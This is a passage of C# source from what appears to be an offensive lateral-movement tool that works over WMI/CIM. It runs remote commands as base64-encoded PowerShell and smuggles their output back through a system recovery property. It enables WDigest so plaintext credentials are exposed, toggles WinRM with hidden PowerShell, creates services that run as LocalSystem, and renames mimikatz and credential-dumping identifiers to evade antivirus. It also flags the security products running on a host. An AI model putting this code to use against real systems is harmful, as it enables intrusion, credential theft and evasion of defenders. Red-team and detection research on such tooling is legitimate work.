                    cimParams.Add(CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In));

                    // We only need the first instance
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);

                    // Give it a second to write
                    System.Threading.Thread.Sleep(1000);
                }

                // Set OSRecovery back to normal pls
                SetOsRecovery(cimSession, originalWmiProperty);

                if (resetEnvSize)
                {
                    // Set the maxEnvelopeSizeKB back to the default val if we set it previously
                    EnvelopeSize.SetLocalMaxEnvelopeSize(500);
                    EnvelopeSize.SetMaxEnvelopeSize("500", cimSession);
                }
            }
            else
            {
                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
            }

            return true;
        }


        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ///////////////////////////////////////////////          Lateral Movement Facilitation            /////////////////////////////////////////////////////////////////////


        public object command_exec(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string command = planter.Commander.Execute;
            string[] newProcs = {"powershell.exe", "notepad.exe", "cmd.exe"};

            // Create a timeout for creating a new process
            TimeSpan timeout = new TimeSpan(0, 0, 15);


            string originalWmiProperty = GetOsRecovery(cimSession);
            bool wsman = true;
            bool noDebugCheck = newProcs.Any(command.Split(' ')[0].ToLower().Contains);

            Messenger.GoodMessage("[+] Executing command: " + planter.Commander.Execute);
            Messenger.GoodMessage("--------------------------------------------------------\n");


            if (!planter.Commander.NoPS)
            {
                if (wsman)
                {
                    // We can modify this later easily to pass wsman if needed
                    using (PowerShell powershell = PowerShell.Create())
                    {
                        try
                        {
                            if (!string.IsNullOrEmpty(planter.System?.ToString()))
                                powershell.Runspace = RunspaceCreate(planter);
                            else
                            {
                                powershell.Runspace = RunspaceCreateLocal();
                                powershell.AddCommand(command);
                                Collection<PSObject> result = powershell.Invoke();
                                foreach (PSObject a in result)
                                {
                                    Console.WriteLine(a);
                                }

                                return true;
                            }
                        }
                        catch (PSRemotingTransportException)
                        {
                            wsman = false;
                            goto GetOut; // Do this so we're not doing below work when we don't need to
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        }

                        if (powershell.Runspace.ConnectionInfo != null)
                        {
                            string command1 = "$data = (" + command + " | Out-String).Trim()";
                            const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
                            const string command3 =
                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                            powershell.Commands.AddScript(command1, false);
                            powershell.Commands.AddScript(command2, false);
                            powershell.Commands.AddScript(command3, false);

                            // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
                            if (noDebugCheck)
                            {
                                // start the timer and get a timeout
                                DateTime startTime = DateTime.Now;
                                IAsyncResult asyncPs = powershell.BeginInvoke();

                                while (asyncPs.IsCompleted == false)
                                {
                                    //Console.WriteLine("Waiting for pipeline to finish...");
                                    Thread.Sleep(5000);

                                    // Check on our timeout here
                                    TimeSpan elasped = DateTime.Now.Subtract(startTime);
                                    if (elasped > timeout)
                                        break;
                                }

                                //powershell.EndInvoke(asyncPs);
                            }
                            else
                            {
                                powershell.Invoke();
                            }
                        }
                        else
                            wsman = false;
                    }
                }

                GetOut:
                if (wsman == false)
                {
                    if (string.IsNullOrEmpty(planter.System?.ToString()))
                    {
                        try
                        {
                            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
                            {
                                RedirectStandardOutput = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

                            Process proc = new Process { StartInfo = procStartInfo };
                            proc.Start();

                            // Get the output into a string
                            string result = proc.StandardOutput.ReadToEnd();
                            // Display the command output.
                            Console.WriteLine(result);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        }

                        return true;
                    }


                    // Create the parameters and create the new process. Broken out to make it easier to follow what's up
                    string encodedCommand = "$data = (" + command +
                                            " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
                    var encodedCommandB64 =
                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
                    string fullCommand = "powershell -enc " + encodedCommandB64;

                    CimMethodParametersCollection cimParams = new CimMethodParametersCollection
                    {
                        CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In)
                    };

                    if (noDebugCheck)
                    {
                        // operation options for timeout
                        CimOperationOptions operationOptions = new CimOperationOptions
                        {
                            Timeout = TimeSpan.FromMilliseconds(10000),
                        };

                        // Let's create a new instance
                        CimInstance cimInstance = new CimInstance("Win32_Process");
                        cimSession.InvokeMethod(Namespace, cimInstance, "Create", cimParams, operationOptions);
                        Thread.Sleep(20000);
                    }

                    else
                        cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
                }

                // Give it a second to write
                Thread.Sleep(1000);


                // Give it a second to write and check for changes to DebugFilePath
                Thread.Sleep(1000);

                if (!noDebugCheck)
                {
                    CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);

                    //Get the contents of the file in the DebugFilePath prop
                    string[] commandOutput = GetOsRecovery(cimSession).Split(',');
                    StringBuilder output = new StringBuilder();

                    //Print output.
                    foreach (string integer in commandOutput)
                    {
                        try
                        {
                            char a = (char)Convert.ToInt32(integer);
                            output.Append(a);
                        }
                        catch
                        {
                            //pass
                        }
                    }

                    Console.WriteLine(output);
                }
                else
                    Console.WriteLine("New process spawned, not checking for output");

                SetOsRecovery(cimSession, originalWmiProperty);

            }

            else
            {
                Console.WriteLine("Shhh...Not using PS");

                // Create the parameters and create the new process.
                CimMethodParametersCollection cimParams = new CimMethodParametersCollection
                    {
                        CimMethodParameter.Create("CommandLine", planter.Commander.Execute, CimFlags.In)
                    };

                CimMethodResult results = cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);

                Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                ? "Successfully created process"
                : "Issues creating process");
            }

            return true;
        }


        public object disable_wdigest(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;

            // Create the parameters and create the new process. Broken out to make it easier to follow what's up
            CimMethodResult results = RegistryMod.CheckRegistryCim("GetDWORDValue", 0x80000002,
                "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
                "UseLogonCredential", cimSession);

            
            if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0)
            {
                if (results.OutParameters["uValue"].Value.ToString() != "0")
                {
                    // wdigest is enabled, let's disable it
                    CimMethodResult resultsSet = RegistryMod.SetRegistryCim("SetDWORDValue", 0x80000002,
                        "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
                        "UseLogonCredential", data:"0", cimSession);

                    if (Convert.ToUInt32(resultsSet.ReturnValue.Value.ToString()) == 0)
                        Console.WriteLine("Successfully disabled wdigest");
                    else
                        Console.WriteLine("Error disabling wdigest");
                }
                else
                    Console.WriteLine("wdigest already disabled");
            }
            else
            {
                // GetDWORDValue call failed
                throw new PropertyNotFoundException();
            }

            return true;
        }

        public object enable_wdigest(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;

            // Create the parameters and create the new process. Broken out to make it easier to follow what's up
            // Let's use the already created method we have eh? :)
            CimMethodResult results = RegistryMod.CheckRegistryCim("GetDWORDValue", 0x80000002,
                "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
                "UseLogonCredential", cimSession);

            if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0)
            {
                if (results.OutParameters["uValue"].Value.ToString() == "0")
                {
                    // wdigest is disabled, let's enable it
                    CimMethodResult resultsSet = RegistryMod.SetRegistryCim("SetDWORDValue", 0x80000002,
                        "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
                        "UseLogonCredential", data:"1", cimSession);

                    if (Convert.ToUInt32(resultsSet.ReturnValue.Value.ToString()) == 0)
                        Console.WriteLine("Successfully enabled wdigest");
                    else
                        Console.WriteLine("Error enabling wdigest");
                }
                else
                    Console.WriteLine("wdigest already enabled");
            }
            else if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 1)
            {
                // wdigest key is not found, let's create it
                CimMethodResult resultsSet = RegistryMod.SetRegistryCim("SetDWORDValue", 0x80000002,
                    "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
                    "UseLogonCredential", data: "1", cimSession);

                if (Convert.ToUInt32(resultsSet.ReturnValue.Value.ToString()) == 0)
                    Console.WriteLine("Successfully created and enabled wdigest");
                else
                    Console.WriteLine("Error enabling wdigest");
            }
            else
            {
                // GetDWORDValue call failed
                throw new PropertyNotFoundException();
            }
            return true;
        }


        public object disable_winrm(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;

            if (!planter.Commander.NoPS)
            {
                // Create the parameters and create the new process.
                CimMethodParametersCollection cimParams = new CimMethodParametersCollection
                {
                    CimMethodParameter.Create("CommandLine", "powershell -w hidden -command \"Disable-PSRemoting -Force\"",
                        CimFlags.In)
                };

                // We only need the first instance
                CimMethodResult results =
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);

                // Give it a second to write
                Thread.Sleep(1000);

                Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                    ? "Successfully disabled WinRM"
                    : "Issues disabling WinRM");
                return true;
            }
            else
            {
                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
                return null;
            }
        }

        public object enable_winrm(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;

            if (!planter.Commander.NoPS)
            {
                // Create the parameters and create the new process.
                CimMethodParametersCollection cimParams = new CimMethodParametersCollection
                {
                    CimMethodParameter.Create("CommandLine", "powershell -w hidden -command \"Enable-PSRemoting -Force\"",
                        CimFlags.In)
                };

                // We only need the first instance
                CimMethodResult results =
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);

                // Give it a second to write
                Thread.Sleep(1000);

                Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                    ? "Successfully enabled WinRM"
                    : "Issues enabled WinRM");
                return true;
            }
            else
            {
                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
                return null;
            }
        }

        public object registry_mod(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string command = planter.Commander.Command;
            string fullRegKey = planter.Commander.RegKey;
            string regSubKey = planter.Commander.RegSubKey;
            string regValue = planter.Commander.RegVal;
            string passedRegValType = planter.Commander.RegValType;

            Dictionary<string, uint> regRootValues = new Dictionary<string, uint>
            {
                { "HKCR", 0x80000000 },
                { "HKEY_CLASSES_ROOT", 0x80000000 },
                { "HKCU", 0x80000001 },
                { "HKEY_CURRENT_USER", 0x80000001 },
                { "HKLM", 0x80000002 },
                { "HKEY_LOCAL_MACHINE", 0x80000002 },
                { "HKU", 0x80000003 },
                { "HKEY_USERS", 0x80000003 },
                { "HKCC", 0x80000005 },
                { "HKEY_CURRENT_CONFIG", 0x80000005 }
            };

            // Shouldn't really need more types for now. This can be added to later on
            string[] regValType = { "REG_SZ", "REG_EXPAND_SZ", "REG_BINARY", "REG_DWORD", "REG_MULTI_SZ" };

            // Grab the root key
            string[] fullRegKeyArray = fullRegKey.Split(new[] { '\\' }, 2);
            string defKey = fullRegKeyArray[0].ToUpper();
            string regKey = fullRegKeyArray[1];


            //Make sure the root key is valid
            if (!regRootValues.ContainsKey(defKey))
            {
                Messenger.ErrorMessage("[-] Root registry key needs to be in the correct form and valid (ex: HKCU or HKEY_CURRENT_USER)");
                return null;
            }

            if (command == "reg_create")
            {
                if (!regValType.Any(passedRegValType.ToUpper().Contains))
                {
                    Messenger.ErrorMessage("[-] Registry value type needs to be in the correct form and valid (REG_SZ, REG_BINARY, or REG_DWORD)");
                    return null;
                }

                // Let's get the proper method depending on the type of data
                GetMethods method = new GetMethods(passedRegValType.ToUpper());
                RegistryMod.SetRegistryCim(method.RegSetMethod, regRootValues[defKey], regKey, regSubKey, regValue, cimSession);
            }

            string pulledRegValType;
            switch (command)
            {
                case "reg_delete":
                {
                        // Grab the correct type for the registry data entry
                        GetMethods method = null;
                        try
                        {
                            pulledRegValType = RegistryMod.CheckRegistryTypeCim(regRootValues[defKey], regKey, regSubKey, cimSession);
                            method = new GetMethods(pulledRegValType);
                        }
                        catch (TargetInvocationException)
                        {
                            Messenger.ErrorMessage("[-] Registry key not valid, not modifying or deleting");
                            System.Environment.Exit(1);
                        }
                        catch (IndexOutOfRangeException)
                        {
                            Messenger.ErrorMessage("[-] Registry key not valid, not modifying or deleting");
                            System.Environment.Exit(1);
                        }

                        CimMethodResult resultDel = RegistryMod.CheckRegistryCim(method.RegGetMethod,
                            regRootValues[defKey], regKey, regSubKey, cimSession);
                        if (Convert.ToUInt32(resultDel.ReturnValue.Value.ToString()) == 0)
                            RegistryMod.DeleteRegistryCim(regRootValues[defKey], regKey, regSubKey, cimSession);
                        else
                        {
                            Console.WriteLine("Issue deleting registry value");
                            return null;
                        }
                        break;
                }
                case "reg_mod":
                {
                    GetMethods method = null;
                    try
                    {
                        pulledRegValType = RegistryMod.CheckRegistryTypeCim(regRootValues[defKey], regKey, regSubKey, cimSession);
                        method = new GetMethods(pulledRegValType);
                    }
                    catch (TargetInvocationException)
                    {
                        Messenger.ErrorMessage("[-] Registry key not valid, not modifying or deleting");
                        System.Environment.Exit(1);
                    }
                    catch (IndexOutOfRangeException)
                    {
                        Messenger.ErrorMessage("[-] Registry key not valid, not modifying or deleting");
                        System.Environment.Exit(1);
                    }

                    //Let's check the reg
                    CimMethodResult resultMod = RegistryMod.CheckRegistryCim(method.RegGetMethod, regRootValues[defKey],
                        regKey, regSubKey, cimSession);
                    if (Convert.ToUInt32(resultMod.ReturnValue.Value.ToString()) == 0)
                    {
                        RegistryMod.SetRegistryCim(method.RegSetMethod, regRootValues[defKey], regKey, regSubKey, regValue,
                            cimSession);
                    }
                    else
                    {
                        Console.WriteLine("Issue modifying registry value");
                        return null;
                    }

                    break;
                }
            }

            return true;
        }

        public object remote_posh(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string powerShellFile = planter.Commander.File;
            string cmdlet = planter.Commander.Cmdlet;

            string originalWmiProperty = GetOsRecovery(cimSession);
            bool wsman = true;
            string[] powerShellExtensions = {"ps1", "psm1", "psd1"};
            string modifiedWmiProperty = null;

            if (!File.Exists(powerShellFile))
            {
                Messenger.ErrorMessage(
                    "[-] Specified local PowerShell script does not exist, not running PS runspace\n");
                return null;
            }

            //Make sure it's a PS script
            if (!powerShellExtensions.Any(Path.GetExtension(powerShellFile).Contains))
            {
                Messenger.ErrorMessage(
                    "[-] Specified local PowerShell script does not have the correct extension not running PS runspace\n");
                return null;
            }

            Messenger.GoodMessage("[+] Executing cmdlet: " + cmdlet);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            if (wsman == true)
            {
                // We can modify this later easily to pass wsman if needed
                using (PowerShell powerShell = PowerShell.Create())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                            powerShell.Runspace = RunspaceCreate(planter);
                        else
                            powerShell.Runspace = RunspaceCreateLocal();
                    }
                    catch (PSRemotingTransportException)
                    {
                        wsman = false;
                    }

                    string script = File.ReadAllText(powerShellFile ?? throw new InvalidOperationException());

                    // Let's remove all comment blocks to save space/keep it from getting flagged
                    script = Regex.Replace(script, @"(?s)<#(.*?)#>", string.Empty);
                    // Let's also remove whitespace
                    script = Regex.Replace(script, @"^\s*$[\r\n]*", string.Empty, RegexOptions.Multiline);
                    // And all comments
                    script = Regex.Replace(script, @"#.*", "");

                    // Let's also modify all functions to random (but keep the name of the one we want)
                    // This is pretty hacky but i think will work for now
                    string functionToRun = RandomString(10);
                    script = Regex.Replace(script, planter.Commander.Cmdlet, functionToRun, RegexOptions.IgnoreCase);
                    //script = script.Replace(planter.Commander.Cmdlet, functionToRun);
                    //script = Regex.Replace(script, @"Function .*", "Function " + RandomString(10), RegexOptions.IgnoreCase);
                    //script = script.Replace(functionToRun, "Function " + functionToRun);


                    // Try to remove mimikatz and replace it with something else along with some other 
                    // replacements from here https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
                    script = Regex.Replace(script, @"\bmimikatz\b", RandomString(5), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bdumpcreds\b", RandomString(6), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bdumpcerts\b", RandomString(6), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bargumentptr\b", RandomString(4), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc1\b", RandomString(10), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc2\b", RandomString(10), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc3\b", RandomString(10), RegexOptions.IgnoreCase);

                    if (powerShell.Runspace.ConnectionInfo != null)
                    {
                        // This all works right now but if we see issues down the line with output we may need to throw the output in DebugFilePath property
                        // Will want to add in some obfuscation
                        powerShell.AddScript(script).AddScript("Invoke-Expression ; " + functionToRun);
                        Collection<PSObject> results;
                        try
                        {
                            results = powerShell?.Invoke();
                        }
                        catch (RemoteException e)
                        {
                            Messenger.ErrorMessage("[-] Error: Issues with PowerShell script, it may have been flagged by AV");
                            Console.WriteLine(e);
                            throw new CaughtByAvException(e.Message);
                        }

                        if (results != null)
                            foreach (PSObject result in results)
                            {
                                Console.WriteLine(result);
                            }

                        return true;
                    }
                    else
                        wsman = false;
                }
            }

            if (wsman == false)
            {
                List<int> intList = new List<int>();
                byte[] scriptBytes = File.ReadAllBytes(powerShellFile);

                //Convert from byte to int (bytes)
                foreach (byte uploadByte in scriptBytes)
                {
                    int a = uploadByte;
                    intList.Add(a);
                }

                SetOsRecovery(cimSession, string.Join(",", intList));

                // Give it a second to write and check for changes to DebugFilePath
                System.Threading.Thread.Sleep(1000);
                CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);

                // Get the debugfilepath again so we can check it later on for longer running tasks
                modifiedWmiProperty = GetOsRecovery(cimSession);

                string encodedCommand =
                    "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [char[]][int[]]$encdata.Split(',') -Join ' '; $a | .(-Join[char[]]@(105,101,120));";
                encodedCommand += "$output = (" + cmdlet + " | Out-String).Trim();";
                encodedCommand += " $EncodedText = [Int[]][Char[]]$output -Join ',';";
                encodedCommand +=
                    " $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()";

                string encodedCommandB64 =
                    "powershell -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                // Create the parameters and create the new process.
                CimMethodParametersCollection cimParams = new CimMethodParametersCollection
                {
                    CimMethodParameter.Create("CommandLine", encodedCommandB64, CimFlags.In)
                };

                // We only need the first instance
                CimMethodResult results =
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);

                Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                    ? "Successfully enabled WinRM"
                    : "Issues enabled WinRM");

                // Give it a second to write
                System.Threading.Thread.Sleep(1000);
            }

            // Give it a second to write and check for changes to DebugFilePath. Should never be null but we should make sure
            System.Threading.Thread.Sleep(1000);
            if (modifiedWmiProperty != null)
                CheckForFinishedDebugFilePath(modifiedWmiProperty, cimSession);


            //Get the contents of the file in the DebugFilePath prop
            string[] commandOutput = GetOsRecovery(cimSession).Split(',');
            StringBuilder output = new StringBuilder();

            //Print output.
            foreach (string integer in commandOutput)
            {
                try
                {
                    var a = (char) Convert.ToInt32(integer);
                    output.Append(a);
                }
                catch
                {
                    //pass
                }
            }

            Console.WriteLine(output);
            SetOsRecovery(cimSession, originalWmiProperty);
            return true;
        }

        public object service_mod(Planter planter)
        {
            // For now, let's just view, start, stop, create, and delete a service, eh?
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string subCommand = planter.Commander.Execute;
            string serviceName = planter.Commander.Service;
            string servicePath = planter.Commander.ServiceBin;

            bool legitService = false;
            CimMethodResult results = null;

            const string query = "SELECT * FROM Win32_Service";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", query);
            IEnumerable<CimInstance> cimInstances = queryInstance as CimInstance[] ?? queryInstance.ToArray();

            switch (subCommand)
            {
                case "list":
                {
                    Console.WriteLine("{0,-45}{1,-40}{2,15}{3,15}", "Name", "Display Name", "State", "Accept Stopping?");
                    Console.WriteLine("{0,-45}{1,-40}{2,15}{3,15}", "-----------", "-----------", "-------", "-------");

                    foreach (CimInstance cimObject in cimInstances)
                    {
                        if (cimObject.CimInstanceProperties["DisplayName"].Value != null && cimObject.CimInstanceProperties["Name"].Value != null)
                        {
                            string name = cimObject.CimInstanceProperties["Name"].Value.ToString();
                            if (name.Length > 40)
                                name = Truncate(name, 40) + "...";
                            string displayName = cimObject.CimInstanceProperties["DisplayName"].Value.ToString();
                            if (displayName.Length > 35)
                                displayName = Truncate(displayName, 35) + "...";

                            try
                            {
                                Console.WriteLine("{0,-45}{1,-40}{2,15}{3,15}", name, displayName, cimObject.CimInstanceProperties["State"].Value, cimObject.CimInstanceProperties["AcceptStop"].Value);
                            }
                            catch
                            {
                                //value probably doesn't exist, so just pass
                            }
                        }
                    }

                    break;
                }
                case "start":
                {
                    // Let's make sure the service name is valid
                    foreach (CimInstance cimObject in cimInstances)
                    {
                        if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                        {
                            if (cimObject.CimInstanceProperties["State"].Value.ToString() != "Running")
                                legitService = true;
                            else
                            {
                                Messenger.WarningMessage("The process is already running, please stop it first");
                                return null;
                            }
                        }
                    }

                    if (legitService)
                    {
                        // Execute the method and obtain the return values.

                        foreach (CimInstance CimObject in cimInstances)
                        {
                            if (CimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                            {
                                results = cimSession.InvokeMethod(CimObject, "StartService", null);
                            }
                        }

                        // List outParams
                        if (results != null)
                            switch (Convert.ToUInt32(results.ReturnValue.Value))
                            {
                                case 0:
                                    Console.WriteLine($"Successfully started service: {serviceName}");
                                    return queryInstance;
                                case 1:
                                    Console.WriteLine($"The request is not supported for service: {serviceName}");
                                    return null;
                                case 2:
                                    Console.WriteLine(
                                        $"The user does not have the necessary access for service: {serviceName}");
                                    return null;
                                case 7:
                                    Console.WriteLine(
                                        "The service did not respond to the start request in a timely fasion, is the binary an actual service binary?");
                                    return null;
                                case 8:
                                    Console.WriteLine($"The service is likely not a service executable for service: {serviceName}");
                                    return null;
                                default:
                                Console.WriteLine(
                                    $"The service: {serviceName} was not started. Return code:  {Convert.ToUInt32(results.ReturnValue.Value)}");
                                return null;
                            }
                    }

                    else
                    {
                        throw new ServiceUnknownException(serviceName);
                    }
                    break;
                }

                case "stop":
                {
                    // Let's make sure the service name is valid
                    foreach (CimInstance cimObject in cimInstances)
                    {
                        if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                        {
                            if (cimObject.CimInstanceProperties["State"].Value.ToString() == "Running" && cimObject.CimInstanceProperties["AcceptStop"].Value.ToString() == "True")
                                legitService = true;
                            else
                            {
                                Messenger.WarningMessage("The process is not running or does not accept stopping, please start it first or try another service");
                                return null;
                            }
                        }
                    }

                    if (legitService)
                    {
                        try
                        {
                            // Execute the method and obtain the return values.
                            foreach (CimInstance cimObject in cimInstances)
                            {
                                if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                                {
                                    results = cimSession.InvokeMethod(cimObject, "StopService", null);
                                }
                            }

                            // List outParams
                            switch (Convert.ToUInt32(results.ReturnValue.Value))
                            {
                                case 0:
                                    Console.WriteLine($"Successfully stopped service: {serviceName}");
                                    return queryInstance;
                                case 1:
                                    Console.WriteLine($"The request is not supported for service: {serviceName}");
                                    return null;
                                case 2:
                                    Console.WriteLine($"The user does not have the necessary access for service: {serviceName}");
                                    return null;
                                default:
                                    Console.WriteLine($"The service: {serviceName} was not stopped. Return code: {Convert.ToUInt32(results.ReturnValue.Value)}");
                                    return null;
                            }
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"Exception {e.Message} Trace {e.StackTrace}");
                            return null;
                        }
                    }
                    else
                    {
                        throw new ArgumentNullException(serviceName);
                    }
                }
                case "delete":
                {
                    // Let's make sure the service name is valid
                    foreach (CimInstance cimObject in cimInstances)
                    {
                        if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                        {
                            if (cimObject.CimInstanceProperties["State"].Value.ToString() == "Running" && cimObject.CimInstanceProperties["AcceptStop"].Value.ToString() == "True")
                            {
                                // Let's stop the service
                                legitService = true;
                                results = cimSession.InvokeMethod(new CimInstance(
                                    $"Win32_Process.Name='{serviceName}'", Namespace), "StopService", null);
                            
                                if (Convert.ToUInt32(results.ReturnValue.Value) != 0)
                                    Messenger.WarningMessage("[-] Warning: Unable to stop the service before deletion. Still marking the service to be deleted after stopping");
                            }
                            else if (cimObject.CimInstanceProperties["State"].Value.ToString() == "Stopped")
                            {
                                legitService = true;
                            }

                            else
                            {
                                Messenger.WarningMessage("The process is not running or does not accept stopping, please start it first or try another service");
                                return null;
                            }
                        }
                    }

                    if (legitService)
                    {
                        foreach (CimInstance cimObject in cimInstances)
                        {
                            if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                            {
                                results = cimSession.InvokeMethod(cimObject, "Delete", null);
                            }
                        }

                        // List outParams
                        if (results != null)
                            switch (Convert.ToUInt32(results.ReturnValue.Value))
                            {
                                case 0:
                                    Console.WriteLine($"Successfully deleted service: {serviceName}");
                                    return queryInstance;
                                case 1:
                                    Console.WriteLine($"The request is not supported for service: {serviceName}");
                                    return null;
                                case 2:
                                    Console.WriteLine(
                                        $"The user does not have the necessary access for service: {serviceName}");
                                    return null;
                                default:
                                    Console.WriteLine(
                                        $"The service: {serviceName} was not stopped. Return code: {Convert.ToUInt32(results.ReturnValue.Value)}");
                                    return null;
                            }
                    }

                    else
                    {
                        throw new ServiceUnknownException(serviceName);
                    }

                    break;
                }
                case "create":
                {
                    // Let's make sure the service name is not already used
                    foreach (CimInstance cimObject in cimInstances)
                    {
                        if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                        {
                            Messenger.ErrorMessage("The process name provided already exists, please specify another one");
                            return null;
                        }
                    }

                    // Add the in-parameters for the method
                    CimMethodParametersCollection cimParams = new CimMethodParametersCollection
                    {
                        CimMethodParameter.Create("Name", serviceName, CimFlags.In),
                        CimMethodParameter.Create("DisplayName", serviceName, CimFlags.In),
                        CimMethodParameter.Create("PathName", servicePath, CimFlags.In),
                        CimMethodParameter.Create("ServiceType", byte.Parse("16"), CimFlags.In),
                        CimMethodParameter.Create("ErrorControl", byte.Parse("2"), CimFlags.In),
                        CimMethodParameter.Create("StartMode", "Automatic", CimFlags.In),
                        CimMethodParameter.Create("DesktopInteract", true, CimFlags.In),
                        CimMethodParameter.Create("StartName", ".\\LocalSystem", CimFlags.In),
                        CimMethodParameter.Create("StartPassword", "", CimFlags.In)
                    };

                    // Execute the method and obtain the return values.
                    results = cimSession.InvokeMethod(new CimInstance("Win32_Service", Namespace), "Create", cimParams);

                    // List outParams
                    switch (Convert.ToUInt32(results.ReturnValue.Value))
                    {
                        case 0:
                            Console.WriteLine($"Successfully created service: {serviceName}");
                            return queryInstance;
                        case 1:
                            Console.WriteLine($"The request is not supported for service: {serviceName}");
                            return null;
                        case 2:
                            Console.WriteLine($"The user does not have the necessary access for service: {serviceName}");
                            return null;
                        default:
                            Console.WriteLine(
                                $"The service: {serviceName} was not created. Return code: {Convert.ToUInt32(results.ReturnValue.Value)}");
                            return null;
                    }
                }
            }

            return queryInstance;
        }

        public object ps(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;

            const string query = "SELECT * FROM Win32_Process";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", query);

            Console.WriteLine("{0,-50}{1,15}", "Name", "Handle");
            Console.WriteLine("{0,-50}{1,15}", "-----------", "---------");

            foreach (CimInstance cimObject in queryInstance)
            {
                string name = cimObject.CimInstanceProperties["Name"].Value.ToString();
                if (name.Length > 45)
                    name = Truncate(name, 45) + "...";
                try
                {
                    if (Messenger.AVs.Any(name.ToLower().Equals))
                    {
                        // Make AV/EDR pop
                        if (Console.BackgroundColor == ConsoleColor.Black)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("{0,-50}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value);
                            Console.ResetColor();
                        }
                    }
                    else if (Messenger.Admin.Any(name.ToLower().Equals))
                    {
                        // Make AV/EDR pop
                        if (Console.BackgroundColor == ConsoleColor.Black)
                        {
                            Console.ForegroundColor = ConsoleColor.Cyan;
                            Console.WriteLine("{0,-35}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value);
                            Console.ResetColor();
                        }
                    }
                    else
                        Console.WriteLine("{0,-35}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value);

                }
                catch
                {
                    //value probably doesn't exist, so just pass
                }
            }

            Messenger.BlueMessage("\nDenotes a potential admin tool");
            Messenger.ErrorMessage("Denotes a potential AV/EDR product");
            return queryInstance;
        }

        public object process_kill(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string processToKill = planter.Commander.Process;

            Dictionary<string, string> procDict = new Dictionary<string, string>();

